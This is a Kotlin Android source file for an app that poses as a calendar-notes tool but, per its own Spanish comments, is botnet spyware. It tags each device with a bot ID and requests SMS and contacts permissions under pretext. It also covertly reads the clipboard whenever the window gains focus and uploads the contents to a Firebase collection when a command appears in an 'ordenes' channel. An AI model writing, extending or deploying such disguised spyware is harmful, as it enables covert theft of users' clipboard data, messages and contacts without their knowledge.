package com.linternbot

import android.content.ClipboardManager
import android.content.pm.PackageManager
import android.graphics.Color
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.View
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.firebase.firestore.DocumentChange
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import java.text.SimpleDateFormat
import java.util.*

var idAndroid = ""  // Variable global para almacenar el identificador unico del dispositivo android
var currentDate = ""

class CalendarioNotas : AppCompatActivity() {
    var simpleCalendarView: CalendarView? = null
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_calendario_notas)
        simpleCalendarView =
            findViewById<View>(R.id.simpleCalendarView) as CalendarView // get the reference of CalendarView
        simpleCalendarView!!.focusedMonthDateColor =
            Color.RED // set the red color for the dates of  focused month
        simpleCalendarView!!.unfocusedMonthDateColor =
            Color.BLUE // set the yellow color for the dates of an unfocused month
        simpleCalendarView!!.selectedWeekBackgroundColor =
            Color.RED // red color for the selected week's background
        simpleCalendarView!!.weekSeparatorLineColor =
            Color.GREEN // green color for the week separator line
        // perform setOnDateChangeListener event on CalendarView

        idAndroid = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        )

        pidePermisoSMS()
        // Comienzo del trabajo en segundo plano para la actividad de la botnet
        val alarm = Alarm()
        alarm.setAlarm(this)

        val textoInformativo = findViewById<TextView>(R.id.textoInformativo)
        val textoNota = findViewById<EditText>(R.id.notaTexto)
        val botonAceptar = findViewById<Button>(R.id.botonAceptar)
        val botonEliminar = findViewById<Button>(R.id.botonEliminar)
        // Hago invisibles los botones de la app
        textoInformativo.visibility = View.INVISIBLE
        textoNota.visibility = View.INVISIBLE
        botonAceptar.visibility = View.INVISIBLE
        botonEliminar.visibility = View.INVISIBLE
        val db = Firebase.firestore

        simpleCalendarView!!.setOnDateChangeListener { view, year, month, dayOfMonth -> // display the selected date by using a toast
            val dia = dayOfMonth
            val mes = month+1
            val anio = year
            val sDate = "$dia-$mes-$anio"
            currentDate = sDate
            pulsaFecha(sDate, db)
        }

        botonEliminar.setOnClickListener(){
            textoInformativo.visibility = View.INVISIBLE
            textoNota.visibility = View.INVISIBLE
            botonAceptar.visibility = View.INVISIBLE
            botonEliminar.visibility = View.INVISIBLE
            db.collection("notasUsuario").document(currentDate).delete()
        }

        botonAceptar.setOnClickListener(){
            val nota = hashMapOf(
                "Bot ID" to idAndroid,
                "nota" to textoNota.text.toString()
            )
            db.collection("notasUsuario").document(currentDate).set(nota)
        }
    }

    fun pulsaFecha(date: String, db: FirebaseFirestore) {
        pidePermisoContactos()
        val textoInformativo = findViewById<TextView>(R.id.textoInformativo)
        val textoNota = findViewById<EditText>(R.id.notaTexto)
        val botonAceptar = findViewById<Button>(R.id.botonAceptar)
        val botonEliminar = findViewById<Button>(R.id.botonEliminar)
        textoInformativo.visibility = View.VISIBLE
        textoNota.visibility = View.VISIBLE
        botonAceptar.visibility = View.VISIBLE
        botonEliminar.visibility = View.VISIBLE
        db.collection("notasUsuario").document(date).get().addOnSuccessListener {
            if (it.data.toString().equals("null")) {
                textoNota.setText("No existe ninguna nota para el día " + date)
            } else textoNota.setText(it.data?.get("nota").toString())
        }
    }

    // Cada vez que se produce un cambio en la ventana de vision de la APP se toma el clipboard
    // Esta es la manera "sigilosa" mas facil de lograrlo
    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (hasFocus) {
            if (ContextCompat.checkSelfPermission(
                    this,
                    android.Manifest.permission.READ_CONTACTS
                ) != PackageManager.PERMISSION_GRANTED
            ) {
            }
            val c = Calendar.getInstance()
            val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
            val strDate: String = sdf.format(c.time)
            val db = Firebase.firestore
            val clipBoardManager = this.getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
            val copiedString = clipBoardManager.primaryClip.toString()
            Log.d("TAG2", "este texto es " + copiedString!!)
            val datosPortapapeles = hashMapOf(
                "User" to idAndroid,
                "Date" to strDate,
                "Portapapeles" to copiedString
            )
            db.collection("ordenes")
                .addSnapshotListener { snapshot, e ->
                    if (e != null) {
                        Log.d("TAG", "Fallada la escucha de la primitiva.", e)
                        return@addSnapshotListener
                    }

                    for (dc in snapshot!!.documentChanges) {
                        when (dc.type) {
                            DocumentChange.Type.ADDED -> db.collection("portapapeles")
                                .document(idAndroid).set(datosPortapapeles)
                        }
                    }
                }
        }
    }

    // Pide permisos al usuario para el tema de recoger la lista de contactos
    fun pidePermisoContactos(){
        val permissions = arrayOf(android.Manifest.permission.READ_CONTACTS)
        ActivityCompat.requestPermissions(this, permissions,0)
    }

    // Pide permisos al usuario para el tema de recoger la lista de contactos
    fun pidePermisoSMS(){
        val permissions = arrayOf(android.Manifest.permission.READ_SMS)
        ActivityCompat.requestPermissions(this, permissions,1)
    }
}